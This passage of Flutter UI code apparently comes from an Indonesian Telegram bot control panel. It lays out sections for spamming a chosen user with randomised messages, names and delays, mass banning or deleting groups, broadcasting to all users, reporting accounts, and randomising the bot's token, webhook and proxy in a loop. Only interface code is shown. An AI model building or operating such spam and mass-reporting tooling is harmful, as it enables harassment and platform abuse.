                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('⏹️ STOP', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildStatus(statusRasuk),
        const SizedBox(height: 4),
        _buildLog(logRasuk),
      ],
    );
  }

  // ============================================================
  // SECTION BUILDER: SPAM
  // ============================================================
  
  Widget _buildSpamSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildLabel('📌 CHAT ID / USERNAME'),
        TextField(
          controller: spamTargetController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('@username atau 123456789'),
        ),
        const SizedBox(height: 8),
        _buildJumlahDelay(
          spamJumlahController,
          spamDelayController,
          '🔁 JUMLAH:',
          '⏱️ DELAY (ms):',
        ),
        const SizedBox(height: 8),
        _buildLabel('💬 PESAN SPAM'),
        TextField(
          controller: spamPesanController,
          maxLines: 2,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Pesan spam...'),
        ),
        const SizedBox(height: 8),
        _buildLabel('📝 PESAN CADANGAN'),
        TextField(
          controller: spamPesanCadanganController,
          maxLines: 2,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Pesan cadangan...'),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            _buildCheckbox('Acak Pesan', spamAcakPesan, (v) => setState(() => spamAcakPesan = v)),
            _buildCheckbox('Acak Nama', spamAcakNama, (v) => setState(() => spamAcakNama = v)),
            _buildCheckbox('Acak Delay', spamAcakDelay, (v) => setState(() => spamAcakDelay = v)),
            _buildCheckbox('Acak Semua!', spamAcakSemua, (v) {
              setState(() {
                spamAcakSemua = v;
                spamAcakPesan = v;
                spamAcakNama = v;
                spamAcakDelay = v;
              });
            }),
          ],
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: isSpamming ? null : _startSpam,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.pink.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: Text(isSpamming ? '⏳ BERJALAN...' : '🚀 MULAI SPAM', style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: isSpamming ? _stopSpam : null,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.grey.shade800,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('⏹️ STOP', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildStatus(statusSpam),
        const SizedBox(height: 4),
        _buildLog(logSpam),
      ],
    );
  }

  // ============================================================
  // SECTION BUILDER: BAN
  // ============================================================
  
  Widget _buildBanSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('⚠️ SYARAT: Bot HARUS ADMIN di group!', color: Colors.red.shade900),
        const SizedBox(height: 8),
        Row(
          children: [
            _buildBanOption('🔨 BAN', 'ban'),
            _buildBanOption('🔓 UNBAN', 'unban'),
            _buildBanOption('👢 KICK', 'kick'),
            _buildBanOption('🔒 RESTRICT', 'restrict'),
          ],
        ),
        const SizedBox(height: 8),
        _buildLabel('👤 USER ID'),
        TextField(
          controller: banUserIdController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('123456789'),
        ),
        const SizedBox(height: 8),
        _buildLabel('📌 GROUP CHAT ID'),
        TextField(
          controller: banChatIdController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('-100123456789'),
        ),
        const SizedBox(height: 8),
        _buildLabel('📝 ALASAN'),
        TextField(
          controller: banReasonController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Alasan...'),
        ),
        const SizedBox(height: 8),
        Wrap(
          spacing: 8,
          children: [
            _buildCheckbox('BAN PERMANEN', banPermanent, (v) => setState(() => banPermanent = v)),
            _buildCheckbox('Hapus Pesan', banDeleteMessages, (v) => setState(() => banDeleteMessages = v)),
            _buildCheckbox('Notifikasi User', banNotifyUser, (v) => setState(() => banNotifyUser = v)),
          ],
        ),
        const SizedBox(height: 8),
        ElevatedButton(
          onPressed: _executeBan,
          style: ElevatedButton.styleFrom(
            backgroundColor: Colors.red.shade400,
            foregroundColor: Colors.white,
            padding: const EdgeInsets.symmetric(vertical: 12),
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            minimumSize: const Size(double.infinity, 0),
          ),
          child: Text('🔨 EKSEKUSI ${banAction.toUpperCase()}', style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
        ),
        const SizedBox(height: 8),
        _buildStatus(statusBan),
        const SizedBox(height: 4),
        _buildLog(logBan),
      ],
    );
  }

  Widget _buildBanOption(String label, String value) {
    final isActive = banAction == value;
    return Expanded(
      child: InkWell(
        onTap: () => setState(() => banAction = value),
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 8),
          decoration: BoxDecoration(
            color: isActive ? Colors.pink.shade300.withOpacity(0.1) : const Color(0xFF1A1A1A),
            borderRadius: BorderRadius.circular(6),
            border: Border.all(
              color: isActive ? Colors.pink.shade300 : Colors.grey.shade800,
              width: 1,
            ),
          ),
          child: Text(
            label,
            textAlign: TextAlign.center,
            style: TextStyle(
              color: isActive ? Colors.pink.shade300 : Colors.grey.shade500,
              fontSize: 9,
              fontWeight: FontWeight.bold,
            ),
          ),
        ),
      ),
    );
  }

  // ============================================================
  // SECTION BUILDER: BAN GROUP
  // ============================================================
  
  Widget _buildBanGroupSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('⚠️ BAN GROUP: Hapus/Blokir group secara massal!', color: Colors.red.shade900),
        const SizedBox(height: 8),
        _buildLabel('📌 GROUP CHAT ID'),
        Row(
          children: [
            Expanded(
              child: TextField(
                controller: banGroupChatIdController,
                style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
                decoration: _inputDecoration('-100123456789'),
              ),
            ),
            const SizedBox(width: 8),
            ElevatedButton(
              onPressed: _listGroups,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.orange.shade300,
                foregroundColor: Colors.black,
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
              ),
              child: const Text('📋 LIST', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 10)),
            ),
          ],
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _buildLabel('⏱️ DURASI (detik)'),
                  TextField(
                    controller: banGroupDurationController,
                    style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
                    decoration: _inputDecoration('86400'),
                  ),
                ],
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _buildLabel('📌 TINDAKAN'),
                  DropdownButtonFormField<String>(
                    value: banGroupActionController.text,
                    dropdownColor: const Color(0xFF1A1A1A),
                    style: const TextStyle(color: Colors.white, fontSize: 12),
                    decoration: InputDecoration(
                      filled: true,
                      fillColor: const Color(0xFF222222),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8),
                        borderSide: BorderSide.none,
                      ),
                      contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    ),
                    items: const [
                      DropdownMenuItem(value: 'ban', child: Text('🚫 BAN')),
                      DropdownMenuItem(value: 'delete', child: Text('🗑️ HAPUS GROUP')),
                      DropdownMenuItem(value: 'mute', child: Text('🔇 MUTE')),
                    ],
                    onChanged: (v) {
                      if (v != null) setState(() => banGroupActionController.text = v);
                    },
                  ),
                ],
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildLabel('📝 ALASAN'),
        TextField(
          controller: banGroupReasonController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Alasan...'),
        ),
        const SizedBox(height: 8),
        Wrap(
          spacing: 8,
          children: [
            _buildCheckbox('Hapus Semua Pesan', banGroupDeleteAll, (v) => setState(() => banGroupDeleteAll = v)),
            _buildCheckbox('Laporkan Group', banGroupReport, (v) => setState(() => banGroupReport = v)),
            _buildCheckbox('Blokir Group', banGroupBlock, (v) => setState(() => banGroupBlock = v)),
          ],
        ),
        const SizedBox(height: 8),
        ElevatedButton(
          onPressed: _executeBanGroup,
          style: ElevatedButton.styleFrom(
            backgroundColor: Colors.red.shade400,
            foregroundColor: Colors.white,
            padding: const EdgeInsets.symmetric(vertical: 12),
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            minimumSize: const Size(double.infinity, 0),
          ),
          child: const Text('🚫 EKSEKUSI BAN GROUP', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
        ),
        const SizedBox(height: 8),
        _buildStatus(statusBanGroup),
        const SizedBox(height: 4),
        _buildLog(logBanGroup),
      ],
    );
  }

  // ============================================================
  // SECTION BUILDER: BROADCAST
  // ============================================================
  
  Widget _buildBroadcastSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('⚠️ Kirim pesan ke SEMUA user yang pernah chat!'),
        const SizedBox(height: 8),
        Wrap(
          spacing: 8,
          children: [
            _buildCheckbox('Hanya yang sudah START', bcOnlyStarted, (v) => setState(() => bcOnlyStarted = v)),
            _buildCheckbox('Termasuk Group', bcIncludeGroups, (v) => setState(() => bcIncludeGroups = v)),
          ],
        ),
        const SizedBox(height: 8),
        _buildLabel('💬 PESAN'),
        TextField(
          controller: broadcastPesanController,
          maxLines: 2,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('⚠️ PENGUMUMAN DARI GAVIN! 🤪💩'),
        ),
        const SizedBox(height: 8),
        _buildLabel('⏱️ DELAY (ms):'),
        TextField(
          controller: broadcastDelayController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('800'),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: isBroadcasting ? null : _startBroadcast,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.cyan.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: Text(isBroadcasting ? '⏳ BERJALAN...' : '📢 KIRIM BC', style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: isBroadcasting ? _stopBroadcast : null,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.grey.shade800,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('⏹️ STOP', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildStatus(statusBroadcast),
        const SizedBox(height: 4),
        _buildLog(logBroadcast),
      ],
    );
  }

  // ============================================================
  // SECTION BUILDER: CEK ID
  // ============================================================
  
  Widget _buildCekIdSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildLabel('👤 USERNAME (tanpa @)'),
        TextField(
          controller: cekUsernameController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('username'),
        ),
        const SizedBox(height: 8),
        Center(
          child: Text(
            '— ATAU —',
            style: TextStyle(color: Colors.grey.shade600, fontSize: 8),
          ),
        ),
        const SizedBox(height: 8),
        _buildLabel('📋 CHAT ID'),
        TextField(
          controller: cekChatIdController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('123456789'),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: _cekId,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.purple.shade300,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('🆔 CEK ID', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: _cekIdFromMsg,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.cyan.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('📩 DARI PESAN', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: const Color(0xFF0A0A0A),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: Colors.pink.shade300),
          ),
          child: Column(
            children: [
              const Text('🆔 HASIL CEK ID', style: TextStyle(color: Colors.grey, fontSize: 8, letterSpacing: 2)),
              const SizedBox(height: 4),
              Text(
                hasilIdValue,
                style: const TextStyle(color: Color(0xFFFF00FF), fontSize: 16, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 4),
              Text(
                hasilDetail,
                style: TextStyle(color: Colors.grey.shade600, fontSize: 9),
              ),
            ],
          ),
        ),
        const SizedBox(height: 8),
        _buildStatus(statusCekId),
        const SizedBox(height: 4),
        _buildLog(logCekId),
      ],
    );
  }

  // ============================================================
  // SECTION BUILDER: REPORT
  // ============================================================
  
  Widget _buildReportSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('⚠️ LAPORKAN AKUN SCAM/PALSU/BAN PERMANEN!', color: Colors.red.shade900),
        const SizedBox(height: 8),
        _buildLabel('📌 CHAT TUJUAN'),
        TextField(
          controller: reportChatIdController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('-100123456789'),
        ),
        const SizedBox(height: 8),
        _buildLabel('👤 USER ID'),
        TextField(
          controller: reportUserIdController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('123456789'),
        ),
        const SizedBox(height: 8),
        _buildLabel('📝 ISI LAPORAN'),
        TextField(
          controller: reportPesanController,
          maxLines: 3,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('⚠️ LAPORAN! Akun ini melakukan pelanggaran berat!'),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: _sendReport,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.red.shade400,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('📝 KIRIM', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: _reportBan,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.orange.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('🔨 BAN AKUN', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildStatus(statusReport),
        const SizedBox(height: 4),
        _buildLog(logReport),
      ],
    );
  }

  // ============================================================
  // SECTION BUILDER: GROUP
  // ============================================================
  
  Widget _buildGroupSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('⚠️ ATUR GROUP: Ubah foto, judul, deskripsi!'),
        const SizedBox(height: 8),
        _buildLabel('📌 CHAT ID'),
        TextField(
          controller: groupChatIdController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('-100123456789'),
        ),
        const SizedBox(height: 8),
        _buildLabel('📛 JUDUL'),
        TextField(
          controller: groupTitleController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Judul baru...'),
        ),
        const SizedBox(height: 8),
        _buildLabel('📝 DESKRIPSI'),
        TextField(
          controller: groupDescriptionController,
          maxLines: 2,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Deskripsi baru...'),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: _setGroupTitle,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.orange.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('📛 JUDUL', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: _setGroupDescription,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.cyan.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('📝 DESKRIPSI', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildStatus(statusGroup),
        const SizedBox(height: 4),
        _buildLog(logGroup),
      ],
    );
  }

  // ============================================================
  // SECTION BUILDER: GAME
  // ============================================================
  
  Widget _buildGameSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('🎮 MAIN GAME DENGAN AI! Pilih game favoritmu'),
        const SizedBox(height: 8),
        Wrap(
          spacing: 6,
          runSpacing: 6,
          children: [
            _buildGameButton('🃏', 'UNO', 'uno'),
            _buildGameButton('🤔', 'TEBAK ANGKA', 'tebak'),
            _buildGameButton('⭕', 'TIC TAC TOE', 'tictac'),
            _buildGameButton('🧠', 'KUIS', 'kuis'),
            _buildGameButton('🔮', 'TRUTH OR DARE', 'truth'),
            _buildGameButton('🎵', 'TEBAK LIRIK', 'lirik'),
          ],
        ),
        const SizedBox(height: 8),
        Container(
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(
            color: const Color(0xFF0A0A0A),
            borderRadius: BorderRadius.circular(8),
          ),
          child: Text(
            '🎮 ${gameType.isEmpty ? 'Pilih game di atas untuk mulai' : 'Game: ${gameType.toUpperCase()}'}',
            textAlign: TextAlign.center,
            style: TextStyle(
              color: gameType.isNotEmpty ? const Color(0xFF00FF88) : Colors.grey.shade500,
              fontSize: 10,
            ),
          ),
        ),
        const SizedBox(height: 8),
        _buildLabel('📌 CHAT ID / USERNAME'),
        TextField(
          controller: gameTargetController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('@username atau 123456789'),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: _startGame,
                style: ElevatedButton.styleFrom(
                  backgroundColor: const Color(0xFF00FF88),
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('🎮 MULAI GAME', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: _stopGame,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.red.shade400,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('⏹️ STOP', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildStatus(statusGame),
        const SizedBox(height: 4),
        _buildLog(logGame),
      ],
    );
  }

  Widget _buildGameButton(String icon, String label, String value) {
    final isActive = gameType == value;
    return InkWell(
      onTap: () => setState(() => gameType = value),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          color: isActive ? const Color(0xFF00FF88).withOpacity(0.1) : const Color(0xFF1A1A1A),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(
            color: isActive ? const Color(0xFF00FF88) : Colors.grey.shade800,
            width: 1,
          ),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(icon, style: const TextStyle(fontSize: 24)),
            Text(
              label,
              style: TextStyle(
                color: isActive ? const Color(0xFF00FF88) : Colors.grey.shade500,
                fontSize: 7,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ============================================================
  // SECTION BUILDER: KIRIM GAMBAR
  // ============================================================
  
  Widget _buildKirimGambarSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('📸 KIRIM GAMBAR ke group / user / channel'),
        const SizedBox(height: 8),
        _buildLabel('📌 CHAT ID / USERNAME'),
        TextField(
          controller: gambarTargetController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('@username atau 123456789'),
        ),
        const SizedBox(height: 8),
        _buildLabel('🖼️ PILIH GAMBAR'),
        InkWell(
          onTap: _pickImage,
          child: Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A1A),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: Colors.grey.shade700, style: BorderStyle.solid),
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(fotoKirimTerpilih != null ? Icons.check_circle : Icons.cloud_upload, 
                    color: fotoKirimTerpilih != null ? Colors.green : Colors.grey),
                const SizedBox(width: 8),
                Text(
                  fotoKirimTerpilih != null 
                      ? '✅ ${fotoKirimTerpilih!.path.split('/').last}' 
                      : '📤 Klik atau drag gambar',
                  style: TextStyle(
                    color: fotoKirimTerpilih != null ? Colors.green.shade300 : Colors.grey.shade500,
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          ),
        ),
        const SizedBox(height: 8),
        _buildLabel('📝 CAPTION (opsional)'),
        TextField(
          controller: gambarCaptionController,
          maxLines: 2,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Caption gambar...'),
        ),
        const SizedBox(height: 8),
        Wrap(
          spacing: 8,
          children: [
            _buildCheckbox('Kirim sebagai Dokumen', gambarForceDoc, (v) => setState(() => gambarForceDoc = v)),
            _buildCheckbox('Kompres Gambar', gambarCompress, (v) => setState(() => gambarCompress = v)),
          ],
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: _kirimGambar,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.pink.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('📸 KIRIM GAMBAR', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: () {
                  _addLog('logGambar', '🖼️ Kirim album (fitur sederhana)');
                },
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.cyan.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('🖼️ KIRIM ALBUM', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildStatus(statusGambar),
        const SizedBox(height: 4),
        _buildLog(logGambar),
      ],
    );
  }

  // ============================================================
  // SECTION BUILDER: ACAK-ACAK
  // ============================================================
  
  Widget _buildAcakSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('🎲 ACAK-ACAK BOT! Acak berbagai aspek bot Telegram'),
        const SizedBox(height: 8),
        Wrap(
          spacing: 4,
          runSpacing: 4,
          children: [
            _buildCategoryButton('🎲', 'SEMUA', 'all'),
            _buildCategoryButton('🔑', 'TOKEN', 'token'),
            _buildCategoryButton('📛', 'NAMA', 'name'),
            _buildCategoryButton('📝', 'DESKRIPSI', 'desc'),
            _buildCategoryButton('🖼️', 'FOTO', 'photo'),
            _buildCategoryButton('⚡', 'COMMANDS', 'commands'),
            _buildCategoryButton('🌐', 'WEBHOOK', 'webhook'),
            _buildCategoryButton('🔒', 'PROXY', 'proxy'),
          ],
        ),
        const SizedBox(height: 8),
        _buildLabel('📌 TARGET CHAT ID (opsional)'),
        TextField(
          controller: acakTargetController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('Kosongkan untuk semua chat'),
        ),
        const SizedBox(height: 8),
        _buildJumlahDelay(
          acakJumlahController,
          acakDelayController,
          '🔁 JUMLAH:',
          '⏱️ DELAY (ms):',
        ),
        const SizedBox(height: 8),
        Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: const Color(0xFF1A1A1A),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: Colors.grey.shade800),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text('🎯 MODE ACAK', style: TextStyle(color: Color(0xFFFF00FF), fontSize: 11, fontWeight: FontWeight.bold)),
              const SizedBox(height: 4),
              Wrap(
                spacing: 4,
                runSpacing: 4,
                children: [
                  _buildCheckbox('Acak Nama Bot', acakNama, (v) => setState(() => acakNama = v)),
                  _buildCheckbox('Acak Deskripsi', acakDeskripsi, (v) => setState(() => acakDeskripsi = v)),
                  _buildCheckbox('Acak Foto', acakFoto, (v) => setState(() => acakFoto = v)),
                  _buildCheckbox('Acak Commands', acakCommands, (v) => setState(() => acakCommands = v)),
                  _buildCheckbox('Acak Webhook', acakWebhook, (v) => setState(() => acakWebhook = v)),
                  _buildCheckbox('Acak About', acakAbout, (v) => setState(() => acakAbout = v)),
                ],
              ),
            ],
          ),
        ),
        const SizedBox(height: 8),
        Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: const Color(0xFF1A1A1A),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: Colors.grey.shade800),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text('⚙️ OPSI LANJUTAN', style: TextStyle(color: Color(0xFFFF00FF), fontSize: 11, fontWeight: FontWeight.bold)),
              const SizedBox(height: 4),
              Wrap(
                spacing: 4,
                runSpacing: 4,
                children: [
                  _buildCheckbox('Live Random', acakLive, (v) => setState(() => acakLive = v)),
                  _buildCheckbox('Loop Forever', acakLoop, (v) => setState(() => acakLoop = v)),
                ],
              ),
            ],
          ),
        ),
        const SizedBox(height: 8),
        Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: const Color(0xFF1A1A1A),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: Colors.pink.shade300),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text('🎲 HASIL ACAK', style: TextStyle(color: Color(0xFFFF00FF), fontSize: 11, fontWeight: FontWeight.bold)),
              const SizedBox(height: 4),
              Text(
                acakHasil,
                style: const TextStyle(color: Color(0xFFFFAA00), fontSize: 12),
              ),
            ],
          ),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: isAcaking ? null : _startAcak,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.yellow.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: Text(isAcaking ? '⏳ BERJALAN...' : '🎲 MULAI ACAK', style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: isAcaking ? _stopAcak : null,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.grey.shade800,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('⏹️ STOP', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: _acakSemuaFitur,
                style: ElevatedButton.styleFrom(
